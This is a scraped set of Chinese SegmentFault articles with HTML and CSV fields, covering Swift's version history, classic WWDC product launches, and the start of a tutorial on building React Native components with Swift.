                &lt;image  mode=""aspectFit""  class=""select_arrow"" src=""../../images/select_arrow.png""&gt;&lt;/image&gt;
            &lt;/view&gt;
        &lt;/picker&gt;
    &lt;/view&gt;</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bVPgPY?w=375&amp;h=254"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br><a href=""https://github.com/wangqin273/king/tree/master/pickerTest"" rel=""nofollow noreferrer"">完整案例</a></p>

                ", 微信小程序picker组件遇到的问题与解决方案,1531971958,490,1,347,1,1,https://segmentfault.com/a/1190000009797083
61,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/bVOTJe?w=900&amp;h=385"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>万众瞩目的 WWDC 2017 已经落下帷幕，对于 Swift 开发者而言最关心的自然是 “What's New in Swift” 了。</p>
<p>在介绍 Swift 4.0 的新特性之前，还是让我们先回到 2014 年 —— Swift 横空出世的那一年吧。</p>
<p>2014 年的 WWDC 大会上，苹果在毫无预兆的情况下发布了用于 Mac OS X 和 iOS 编程的新一代编程语言 Swift。这一举动让很多专业的开发者一夜回到解放前，OC 程序员表示心很凉，在一门全新的编程语言面前，所有人都是零基础。所幸苹果降低了 Swift 的入门门槛，在程序编写上依然支持 Objective-C 和 C 语言，同时弥补了 Objective-C 的一些不足之处，让更多人更快地入门。</p>
<h2>Swift 1.0 —— 横空出世</h2>
<p>Swift 以前的 iOS 和 OS X 应用开发均使用 Objective-C，而 Objective-C 是一门及其繁琐（verbose）且学习曲线比较陡峭的语言。现在看来，Swift 1.0 确定了整个语言的基线：类型安全、迅速、现代，它告诉开发者使用 Swift 进行开发是完全可能的。Swift 1.0 有了可选的、智能的值类型，以及很多受欢迎的重大特性，得到了很多 Objective-C 程序员的认可。</p>
<p><a href=""https://segmentfault.com/a/1190000000531511"" rel=""nofollow noreferrer"">【WWDC 2014】带您一览苹果全新编程语言Swift</a></p>
<blockquote><p>从这个程序中我们可以看到，用 Swift 足够写出简洁易懂，语法上与其他脚本语言区别非常小，几乎无需学习 Swift 就能理解大概意思的程序。</p></blockquote>
<p><a href=""https://segmentfault.com/p/1210000009692707/read"" rel=""nofollow noreferrer"">来自苹果的编程语言 —— Swift 简介</a></p>
<blockquote>
<p>Swift 是什么？简单的说：</p>
<ul>
<li><p>Swift 用来写 iOS 和 OS X 程序。（估计也不会支持其它屌丝系统）</p></li>
<li><p>Swift 吸取了 C 和 Objective-C 的优点，且更加强大易用。</p></li>
<li><p>Swift 可以使用现有的 Cocoa 和 Cocoa Touch 框架。</p></li>
<li><p>Swift 兼具编译语言的高性能（Performance）和脚本语言的交互性（Interactive）。</p></li>
</ul>
</blockquote>
<p>仅在 Swift 发布的 11 个小时后，开发者 Nate Murray 就放出了基于测试版 Swift 开发的应用 —— 一个重制 Flappy Bird 的简易原型。</p>
<p><a href=""https://segmentfault.com/a/1190000000531810"" rel=""nofollow noreferrer"">第一个受到关注的Swift应用？“Flappy Swift”分享与简析</a></p>
<blockquote><p>推荐对 Swift 感兴趣的开发人阅读这个新作品的代码，并同时建议下载一份目前的版本试用或收藏。</p></blockquote>
<p>动作快的小伙伴也第一时间上手用起来，嗯，用过都说好。</p>
<p><a href=""https://segmentfault.com/p/1210000009697912/read"" rel=""nofollow noreferrer"">用 Swift 开发一个 TODO 应用</a></p>
<blockquote><p>手把手教你如何完成一个 TODO 的应用，功能很简单，就是添加任务和浏览任务。将视屏内容整理了一下。虽然没有什么高深的内容，但是作为一个入门的小程序还是挺适合的。</p></blockquote>
<p>上一次微软大张旗鼓的推出 C# 及其编程平台还是在 2000 年，而将近15年之后，苹果推出了另一门编程语言 Swift。作为一个开发者，能见证一门编程语言的诞生，备感荣幸。</p>
<h2>Swift 2.0 —— 开源万岁</h2>
<p>在 2015 的 WWDC 大会上，苹果宣布将开源 Swift。此外苹果还将公开发布在 OSI 标准许可下的 Swift 的源代码，包括编译器和标准库，开放 Linux 的源代码端口，开发者可以在 Linux 上编写 Swift 程序。不难看出，苹果这些举动意在鼓励开发者从而进一步推动 Swift 的发展。</p>
<p>经过一年的发展，Swift 2.0 有了哪些新特性呢？</p>
<p><a href=""https://segmentfault.com/a/1190000003497072"" rel=""nofollow noreferrer"">Swift 2.0 到底「新」在哪？</a></p>
<blockquote><p>Swift 2.0 涵盖了更多新的功能，如升级的错误处理、协议扩展和可用性检查等。</p></blockquote>
<p><a href=""https://segmentfault.com/a/1190000002922232"" rel=""nofollow noreferrer"">Swift 2.0 初探</a></p>
<blockquote><p>今年 6 月，一年一度的 WWDC 大会如期而至，在大会上 Apple 发布了 Swift 2.0，引入了很多新的特性，以帮助开发者能更快，更简单的构建应用。</p></blockquote>
<p>作为这门语言的使用者，必然也会受到它的影响。</p>
<p><a href=""https://segmentfault.com/a/1190000005004313"" rel=""nofollow noreferrer"">浅析 Swift 给开发者带来的变化</a></p>
<blockquote><p>每一门编程语言都会有一个从推出到趋之完善的过程。Swift 和 Xcode 的问题虽然饱受诟病，然而，个人相信，随着时间的推移和语言自身的成长，Swift 的将来必定会成为主流开发语言之一。</p></blockquote>
<p>Swift 横空出世，如火如荼，那 Swift 在未来有可能会取代 Objective-C 吗？</p>
<p><a href=""https://segmentfault.com/a/1190000003781891"" rel=""nofollow noreferrer"">《Swift基础教程》作者Boisy Pitre：Objective-C很不错，但它已经是过去时</a></p>
<blockquote><p>当然。但是没人知道会用多长时间，但是我认为应该是在 5 年之内。我们很容易就忘记计算机语言的生命有多长（现在 C 语言已经 40 岁了）。Objective-C 不会彻底消失，但是我能预见在未来的某一个时刻，它在语言世界中的份额将变得非常小。</p></blockquote>
<p>那么问题来了，如何以最短的时间快速从 Object-C 过渡到 Swift？</p>
<p><a href=""https://segmentfault.com/a/1190000005084856"" rel=""nofollow noreferrer"">［分享］iOS开发－快速从Object-C过渡到Swift的一个小技巧</a></p>
<blockquote><p>那就是查看 API 文档，这是一个极其取巧且快速省心掌握 OC 和 SW 之间语法变化的方法</p></blockquote>
<h2>Swift 3.0 —— 打破一切</h2>
<p>2016 年 9 月，苹果发布了被称为 “破坏性更新” 的 Swift 3.0。Swift 3.0 可谓 “打破一切”，如果你已精通 Swift 2.0，那升级到 Swift 3.0 无疑是从精通到入门。</p>
<p>保证语言基础的健全以及一致性是一门新语言发展的必经之路，因此也将受到挫折。Swift 3.0 可能不是最有趣的版本，但它让 Swift 更为干净。</p>
<p><a href=""https://segmentfault.com/a/1190000004665443"" rel=""nofollow noreferrer"">Swift 3.0：你的代码即将崩坏</a></p>
<blockquote><p>这意味着什么？恩，首先，从 Swift 2 过渡到 Swift 3 不可避免地将是悬崖式的过渡，大量的代码需要重写，Cocoa 的重命名工作也要落地了，我们将再次创建令人瞩目的科技成果。同样地，我们应该尝试将 “重新布局式的” 改变放到 Swift 3 中，如果可能的话，Swift 3 到 Swift 4 的过渡尽可能平缓一些。</p></blockquote>
<p>还是按照惯例，继续来看看 Swift 3.0 的新特性吧：</p>
<p><a href=""https://segmentfault.com/a/1190000007467754"" rel=""nofollow noreferrer"">Swift 3 新特性</a></p>
<p><a href=""https://segmentfault.com/a/1190000006058419"" rel=""nofollow noreferrer"">Swift3.0 都改变了什么</a></p>
<blockquote><p>经历了从 Swift 1.0 到 2.0，一个版本之后代码居然就不兼容了。这如何在团队推广呢？没有想到 3.0 居然变化更加的大。有多大，来体会一下。</p></blockquote>
<p><a href=""https://segmentfault.com/a/1190000006237653"" rel=""nofollow noreferrer"">【译】Swift 3.0更新概要</a></p>
<blockquote><p>如果你没有一直紧跟 Swift Evolution 的话，你也许会想知道都有哪些改变，以及它将会怎么影响你的代码，并且你该什么时候开始着手把代码 convert 到 3.0，那这篇文章就是写给你的。</p></blockquote>
<p>嗯，看到这里，Swift 2.0 的开发者的内心是崩溃的，含泪写下从 Swift 2.2 到Swift 3 的迁移指南。</p>
<p><a href=""https://segmentfault.com/a/1190000007286006"" rel=""nofollow noreferrer"">一个才适应 Swift 2.2 的开发者眼中的 Swift 3.0 和 iOS 10</a></p>
<blockquote><p>Xcode 8 带着 Swift 3 风风火火的到来了，作为一个平时使用 OC 为主的 iOS 开发来说，Swift 3 正式和 OC-like 语法划定了界限。</p></blockquote>
<h2>Swift 4.0 —— 充满希望</h2>
<p>在开始 Swift 4.0 之前，还是先来看看开发者们对它的期望吧。</p>
<p><a href=""https://segmentfault.com/a/1190000006235300"" rel=""nofollow noreferrer"">【译】回顾 Swift 3, 展望 Swift 4</a></p>
<blockquote><p>Swift 3 的正式版已经接近完成状态了, 是时候来回顾一下发布之前的事情, 从中汲取经验, 并且用来整理一下我们(Swift 社区)在今年做的事情了. 总的来说, Swift 3 无疑将会是一个 Amazing 的版本, 我们做到的很了不起, 谢谢每一个为这件事情贡献力量的人. 比起马上推进那一堆新计划, 更重要的是让我们每个人从整个大局来看, 了解自己做到的这些了不起的事情.</p></blockquote>
<p>需要补充的一点是，自从 Swift 开源之后，大部分社区成员提交的提案都在讨论和修改之后被接受了。而那些被驳回的提案也都在激烈的讨论之后由核心团队来做最后的决定。就连 Apple 自己的工程师在想要做出改变的时候也会打开 Repo 去写提案。借助开源，苹果充当管理者的角色，确保了语言的一致性，通过开源社区的力量更好的完善语言的功能，让 Swift 成为一个更好的语言。</p>
<p>说回本次的更新。</p>
<p><a href=""https://www.hackingwithswift.com/swift4"" rel=""nofollow noreferrer"">What's new in Swift 4.0</a></p>
<blockquote><p>new encoding and decoding, smarter keypaths, multi-line strings, and more!</p></blockquote>
<p>从 WWDC 2017 发布的情况来看，Swift 4.0 做了很多重大的改变，包括 String 的重新设计，Codable 协议的原生支持，原生的 JSON 解析，以及其它很多功能的改进等。因此 Swift 4.0 与 Swift 3.0 并没有十分良好的代码兼容性。</p>
<p>然而，Swift 推出伊始，它的编译器就是支持兼容性模式的，选择 <code>-swift-version-3</code> 能编译大多数 Swift 3.0 的源码，此外在 Swift 4.0 中还修复了错误代码也能在旧编译器中编译通过的漏洞。而 <code>-swift-version-4</code> 将支持所有在 Swift 4.0 设计准则中提到的新特性，开发者可以以 package 为单位逐步将自己的代码库迁移过来。</p>
<h2>拥抱变化</h2>
<p>Swift 4.0 将在 2017 年秋季发布。“种一棵树最好的时间是十年前，其次是现在”，如果你也想尝试用 Swift 进行 iOS 开发，那么现在就动手吧！</p>
<p>Swift 2.2 版本：<a href=""https://segmentfault.com/p/1210000009661911/read"" rel=""nofollow noreferrer"">iOS开发入门案例实战(Swift版)</a></p>
<p>Swift 3.0 版本：<a href=""https://segmentfault.com/a/1190000004200422"" rel=""nofollow noreferrer"">Swift 编程语言学习</a></p>
<p>“Write the Code, Change the World”，开发者们，让我们拥抱变化，用代码来改变世界吧！</p>
<p><em>（本期完）</em><br><br></p>
<hr>
<blockquote>
<p><strong># SegmentFault 技术周刊 #</strong></p>
<p>「技术周刊」是社区特别推出的技术内容系列，一周一主题。周刊筛选的每篇内容，是作者的独到见解，踩坑总结和经验分享。</p>
<p>每周四更新，欢迎「<a href=""https://segmentfault.com/blog/weekly"" rel=""nofollow noreferrer"">关注</a>」或者「<a href=""https://segmentfault.com/blog/weekly"" rel=""nofollow noreferrer"">订阅</a>」。大家也可以在评论处留言自己感兴趣的主题，推荐主题相关的优秀文章。</p>
</blockquote>

                ", SegmentFault 技术周刊 Vol.25 - Swift  开发：从入门到重新入门,1531971960,246,1,193,1,1,https://segmentfault.com/a/1190000009662146
62,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/bVOET4?w=1000&amp;h=604"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2017 年的 WWDC 将在 2017 年 6 月 5 日至 6 月 9 日（ 美国时间 ）在圣何塞的 McEnery 会议中心举行，而从 2003 年开始，WWDC 都在旧金山举办，不知此次苹果再次将 WWDC 搬回圣何塞召开有什么寓意？在谜底揭晓之前，先来简单地了解下 WWDC 相关信息：</p>
<blockquote><p><strong>苹果全球开发者大会</strong>（英语：<code>Apple Worldwide Developers Conference</code>，缩写：WWDC）是苹果公司每年定期在美国加州举办的会议活动，主要目的是向该公司产品的相关软件的设计师们展示最新的软件和技术。另外，在每届 WWDC 的第一天苹果会举行面向公众的开场  Keynote，向用户和开发者介绍即将发布预览版本或发售的软件产品和技术（如新款 iOS 的预览版本、新 OS X），以及新的硬件产品（如新 iPhone、Mac ）</p></blockquote>
<h2>往届 WWDC 经典产品</h2>
<h3>WWDC 1983：Lisa</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOEZK?w=600&amp;h=394"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>第一届的 WWDC 是于 1983 年在加州的蒙特瑞举行，而本次 WWDC 并没有相关的细节，因为与会者需要签署保密协议。在此次大会上，人们见证了世界上首款图形界面个人电脑 Lisa 的现身。事实上，初期的 WWDC 仅仅是关于开发者参与的会议，苹果公司许多重量级消息并不会在 WWDC 上发布，而是在每年两次的股东大会上宣布。此时，WWDC 只是一个为期一周的开发者活动，从周一到周五，使得开发者有更多机会与苹果软件工程师进行互动。</p>
<h3>WWDC 1984：Macintosh</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOEZS?w=610&amp;h=407"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>而在来年，1984 年的 WWDC 大会上，乔布斯向开发者推介了第二款图形界面个人电脑，著名的麦金塔电脑（Macintosh）。也是，1984 年起，WWDC 开始成为开放的大会，周一上午十点向媒体开放。此外，乔布斯通常在会议期间不会宣布新产品，直到周五会议行将结束时才会带来惊喜。</p>
<h3>WWDC 1990：QuickTime</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE0e?w=600&amp;h=338"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>在 1990 年，苹果将重心转移至大众产品。时任苹果 CEO 约翰·斯卡利与运作主管迈克尔·斯平德勒誓言苹果可以借由低端与便携型麦金塔重新占领市场并尽早地吸引和留住新用户。为达成目标，QuickTime 登场。</p>
<h3>WWDC 1997：Rhapsody</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE0F?w=480&amp;h=360"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>而 1997 年的 WWDC 是苹果收购 NeXT 后的第一次大会，也将焦点放在使用 OpenStep 作为下一代 Mac OS 基础的努力。当时的项目是介绍名为“Rhapsody”的新系统，其基于一个<br> OpenStep 版本，并修改外观使之更匹配 Mac 的观感、“黄盒”、以及能让既存 Mac 应用程序在 OS 模拟下运行的“蓝盒”。而 1997 年也是史蒂夫·乔布斯的正式回归苹果的一年，虽然他的身份已经变成了顾问。乔布斯并未在大会上进行正式演讲，但他在提问环节回答了1个多小时的问题。</p>
<h3>WWDC 1998：Mac OS X</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE0R?w=600&amp;h=450"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>当年苹果推出了iMac，乔布斯在演讲中展示了 Carbon，开发者可以使用 Carbon 将自己的旧程序移植到 Mac OS X上。乔布斯花费大量时间演示 Carbon 的特性，鼓励开发者着手为新系统移植现有的应用。</p>
<h3>WWDC 1999：PowerBooks G3</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE09?w=600&amp;h=399"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>乔布斯的精彩演说使 WWDC 变得有趣起来，其严格的保密性也日益降低。PowerBooks G3 的发布令人惊喜，现场抽送50 台，接着演示OS 8.6、OpenGL、Java 2 和 Mac OS X的首个开发者预览版，它看起来同两年后的正式版已无大的差别。</p>
<h3>WWDC 2001：Power Mac G4</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE1i?w=600&amp;h=480"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2001 年乔布斯回归的这几年似乎都和新操作系统有关。这一年，OS X 已经摆上货架，开发者正努力的调试 Cocoa 应用。乔布斯展示了一系列平板显示器并表示所有新出厂的麦金塔都将安装OS X，比原定的计划提早足有两月。Mac OS X Server亦亮相，还有新款 Power Mac G4，用以运行企业级强度的任务。</p>
<h3>WWDC 2002：告别 OS 9</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE1R?w=627&amp;h=353"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>在之前的 1998 年以及 1999 年，乔布斯都向开发者阐释新系统 OS X。而在2002年，他推出了 Sherlock3、Rendezvous、Quartz Extreme 和通讯薄，并发布 OS X 10.2 Jaguar，与会者人手一份。同时，乔布斯也正式宣布苹果不再对 OS 9 进行相关开发，举行了模拟葬礼，让人们向 OS 9道别。</p>
<h3>WWDC 2003：G5</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE2p?w=506&amp;h=300"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2003 年，Moscone 中心的舞台更大了，新一季猫科动物也出现，苹果又有好礼相送，一人一只造型威猛的 iSight 摄像头，Safari 推出了稳定版。不过人们真正关心的，是那片历经 10 年研发的 G5 处理器，以及装载 G5 的 PowerMac G5大机箱，此外，还预览了 Mac OS X 10.3，还发布了 iPhoto、iMovie 和 iDVD 等一系列新版本程序。</p>
<h3>WWDC 2006：Leopard</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE2F?w=600&amp;h=375"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2006 年 WWDC 大会上发布了用来替换 PowerMac G5 系列的专业工作站电脑“Mac Pro”。Xserve服务器也发布了更新，同样搭载双核心的 Xeon 处理器。苹果电脑操作系统Mac OS X v10.5“Leopard”预览也在大会上发布了，包含完整支持 64 位至强处理器的应用程序、Time Machine（文件还原），自带Boot Camp、Front Row以及Photo Booth软件，并发表“Spaces”虚拟桌面功能、改进的Spotlight搜索技术、Core Animation、辅助使用程序技术、Mail软件的强化、新的Dashboard功能，以及Dashcode和iChat的更新等。</p>
<h3>WWDC 2008：iPhone 3G</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE2V?w=1273&amp;h=756"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片"" title=""图片""></span></p>
<p>2008 年的 WWDC 发布了 App Store应用商店，新的 iOS 和 Mac OS X版本，专用于 iPhone 的 OS(iOS) 2.0，以及 iPhone 3G 新硬件。同时，苹果发布 MobileMe，开始涉足云平台服务。</p>
<h3>WWDC 2009：iPhone 3Gs</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE3s?w=800&amp;h=450"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>乔布斯因病未能出席本届 WWDC，副总裁 Phil Schiller 等人合力完成了这一届的主旨演讲。发布了 iOS 3.0，更新了全线 MacBook Pro产品，同时还发布了 iPhone 3Gs，这也是第一款正式进入中国市场的 iPhone。</p>
<h3>WWDC 2010：iPhone 4</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE3B?w=980&amp;h=580"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2010 年 WWDC 主题演讲主要用于发布 iPhone 4，这款手机的配置再次惊艳全场，成为 <br>iPhone 史上最重要的一个型号。同时发布的 iOS 4加入了多任务处理、应用文件夹、iBooks、FaceTime语音通话，邮件应用支持对话式浏览和统一的收件箱，iOS 系统更趋完善。</p>
<h3>WWDC 2011：iOS 5</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE3P?w=600&amp;h=365"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片"" title=""图片""></span></p>
<p>2011 年，乔布斯最后一次登上演讲的舞台，发布了 iCloud、OS X Lion 和 iOS 5，而在同年的 8 月 24 号他辞去了苹果 CEO 的职位，并在 10 月 5 日离开人世。而自此年起，WWDC不再是发表新一代 iPhone 的舞台，常态性地推迟至原本的音乐盛宴(Music Event)。</p>
<h3>WWDC 2012：MacBook Pro</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE4f?w=660&amp;h=439"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2012 年的 WWDC 是首次由苹果新CEO 提姆·库克主持的 WWDC 大会，推出了重量级硬件产品  -- MacBook Pro，被称为“配备 Retina（视网膜）显示屏的 MacBook Pro”（MacBook Pro with Retina Display）,并介绍 OS X Mountain Lion、iOS 6和 Siri 的新功能，还宣布了在 iOS 中苹果将 Google 的地图改为了自己设计的的3D版在线地图，更改了地图应用的图标。</p>
<h3>WWDC 2013：iOS 7 扁平化风</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE4w?w=600&amp;h=353"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2013 年大会上 iOS 7亮相，全新的图标和配色，采用了流行的扁平化风格。相机应用也发生了重大升级，滑动屏幕即可改变拍摄模式，新加入了滤镜功能。并发布了新一代 MacBook Air 和<br> Mac Pro。苹果还展示了OS X Mavericks、iOS 7、iWork for iCloud，以及一个新的音乐流媒体服务，名为iTunes Radio。</p>
<h3>WWDC 2014：Swift</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE44?w=1200&amp;h=1200"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2014 年 WWDC 大会上发布了新的操作系统 OS X 10.10，定名为 Yosemite，新增加的  iCloud Drive 也可以让 Mac 和 iOS 之间的云数据实现共用，系统的改变主要来自全新的全局搜索（Spotlight）以及浏览器 Safari。同时发布了新系统 iOS 8，新增了健康管理系统 HealthKit 以及一个健康管理软件 Health。最重要的是发布了，是用来撰写 Mac OS/OS X、iOS、Watch OS 和 Tv OS的语言的多编程范式和编译式的编译語言：Swift。</p>
<h3>WWDC 2015：One More Thing</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE50?w=600&amp;h=400"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2015 年 WWDC 大会发布了 OS X El Capitan、iOS 9、Swift 2，此外 Apple Music 流媒体音乐服务作为“One More Thing”压轴登场。而本次大会发布的 watch OS 2 无疑为接下来的 Apple Watch 的篇章开了个好头。</p>
<h3>WWDC 2016：Siri、iMessage 等软件在多平台的打通</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVOE68?w=800&amp;h=450"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>2016 年 WWDC 大会上发布了 iOS 10 和 MacOS Sierra。而 WWDC 2016 最大的亮点莫过于 Siri、iMessage 等软件在多平台的打通以及开放。</p>
<h3>WWDC 2017</h3>
<p>2017 年 的 WWDC 将于美国时间 6 月 5 日早上 10 点开始。苹果预计会在这场发布会上公布全新的 iOS 11、mac OS 10.13、watch OS 4、tv OS 11以及新款 Mac 笔记本、iPad 等硬件产品，另外可能还会出现传闻中的 Siri 音箱。</p>
<blockquote><p>ATTENTIONS：SegmentFault 官方也派出了我司的 70 大大远赴美国参加这一盛事，期待 70 大大的前方报道，我们来组团关注 WWDC 2017 吧~</p></blockquote>
<p>扫描下方二维码添加管理媛为好友，备注：WWDC + SF 用户 ID，稍后会拉你进群~</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOIGB?w=159&amp;h=238"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>

                ", 那些年 WWDC 发表的经典产品,1531971962,155,1,89,1,1,https://segmentfault.com/a/1190000009651292
63,1,0,6,"
                    
<h1>使用Swift开发React Native组件（一）</h1>
<blockquote><p>RN已经在圈子里流行很长一段时间了，网上相关的文章和介绍也很多，笔者很早之前也接触过一段时间，但也仅仅只是浅尝即止，这次正好有时间，所以准备深度学习一番，整体调研下来感觉如果只是仅仅学习React层面未免还是太浅薄，遇到很多问题无法从Native去找解决方案，理解上也有差距。<br>IOS平台的RN是用OC编写的，可是OC的语法实在太难下口了，所以笔者选了Swift，但使用Swift的介绍在官网上仅仅只有一小段，民间资料也很少。<br>经过一段时间的探索，几个基础场景已经被笔者攻克，遂将成果分享出来，希望能够帮助到大家，由于笔者也是第一次接触IOS开发，如果有问题还请斧正，谢谢。<br>本系列所有案例都将集中在<a href=""https://github.com/mtyang/React-native-Swift"" rel=""nofollow noreferrer"">GitHub</a>,以后有新的组件也将持续更新。</p></blockquote>
<h2>系列导航</h2>
<p><a href=""https://segmentfault.com/a/1190000009579393"" rel=""nofollow noreferrer"">第一章-IOS开发基础入门</a><br>[第二章-TodoList案例讲解]()<br>[第三章-UI Components]()<br>[第四章-Native Module]()</p>
<h2>本章内容介绍</h2>
<p>因为本系列的目标群体是和笔者一样有前端经验，IOS开发零经验的同学。所以本章讲的东西暂时和RN无关，主要介绍开发工具、学习资料等基础辅助型知识。</p>
<h2>案例GitHub</h2>
<p><a href=""https://github.com/mtyang/React-native-Swift/tree/master/osSwift/"" rel=""nofollow noreferrer"">https://github.com/mtyang/Rea...</a></p>
<h2>OC还要学吗</h2>
<p>个人感觉OC还是要学的，目前市场上很多组件还是以OC为主，有时候为了学习思路还是要看看别人的代码，但是不必像Swift一样深入，入门即可，介绍这篇文章 <a href=""https://github.com/qinjx/30min_guides/blob/master/ios.md/"" rel=""nofollow noreferrer"">https://github.com/qinjx/30mi...</a></p>
<h2>OC TO Swift</h2>
<p>这个工具是将OC代码翻译成Swift，我也是开了下脑洞google一下发现的，这非常有助于我们理解一些OC的代码。</p>
<blockquote><p><a href=""https://objectivec2swift.com/#/home/converter/"" rel=""nofollow noreferrer"">在线翻译</a><br><a href=""https://objectivec2swift.com/#/home/xcode-extension/"" rel=""nofollow noreferrer"">Xcode插件</a> 插件非常好用，强烈推荐。</p></blockquote>
<h2>学习资料</h2>
<h3>基础入门</h3>
<ol>
<li><p><a href=""https://developer.apple.com/library/content/referencelibrary/GettingStarted/DevelopiOSAppsSwift/"" rel=""nofollow noreferrer"">Apple 官方引导</a></p></li>
<li><p><a href=""https://itisjoe.gitbooks.io/swiftgo/content/more/xcode_intro.html"" rel=""nofollow noreferrer"">Xcode入门</a> 推荐</p></li>
</ol>
<h3>语法入门</h3>
<p>有中文PDF和英文原文档<a href=""http://www.swifthumb.com/forum.php?mod=viewthread&amp;tid=21469&amp;page=1&amp;extra=#pid69380"" rel=""nofollow noreferrer"">Swift入门 中文</a> <a href=""https://swift.org/about/"" rel=""nofollow noreferrer"">英文原档</a></p>
<h3>UIkit</h3>
<p>这个类将是我们学习的重点，后面都将用它来构建我们的应用界面，介绍<a href=""https://itisjoe.gitbooks.io/swiftgo/content"" rel=""nofollow noreferrer"">另外一本入门书籍</a>这是一本弯弯同学写的，版本虽然是2.0，但是有xcode这种强大的编辑器会提醒你最新的语法是什么，除了一些关键字翻译的和我们的习惯不一致，其他都讲的不错。</p>
<h3>Playground</h3>
<p>测试JS代码我们要么用node执行测试文件，要么直接在console中直接测试，在Xcode也提供了这样的场所，这在我们一边看文档一边学习时特别有帮助。</p>
<ol><li><p>在项目中新建文件，选择Playground文件类型。</p></li></ol>
<p><span class=""img-wrap""><img data-src=""/img/bVOl9G?w=731&amp;h=523"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<ol><li><p>左边编码后右侧及时反馈代码执行结果，非常适合我们进行算法测试。</p></li></ol>
<p><span class=""img-wrap""><img data-src=""/img/bVOl9O?w=736&amp;h=188"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<h2>Hello world</h2>
<h3>Storyboard</h3>
<p>在IOS的世界中有两种构建界面的方式，一种编码方式，可以理解为在JS中用 <code>document.createElement</code> 来创建HTML。<br>另外一种Storyboard了，Storyboard是IOS开发很强大的一个功能，以至于笔者刚开始接触的时候也被震撼到了，心想这IOS开发也太简单了吧，就是一个拖字诀啊，但是在和我们ios的同学聊过之后才知道业内基本很少使用这个功能，从开发角度是很方便，但是软件从来都是一个工程，我们需要不断的维护和升级，所以在复杂业务场景下使用编码构建界面。</p>
<h3>界面介绍</h3>
<p><a href=""https://itisjoe.gitbooks.io/swiftgo/content/more/open_project.html"" rel=""nofollow noreferrer"">创建项目</a></p>
<p>根据上面的引导就完成了项目的创建,</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOmae?w=1397&amp;h=865"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<blockquote><p>左侧为项目文件目录，中间就是Storyboard的工作台了，右下角则是UI列表。</p></blockquote>
<h2>两个 Storyboard</h2>
<p>注意看上图中左边文件中有两个Storyboard类型的文件。<br><code>LaunchScreen.storyboard</code>是开启APP时的引导界面。<br><code>Main.storyboard</code>是应用的内容界面。<br>这两个文件也可以在下图的地方进行个配置。</p>
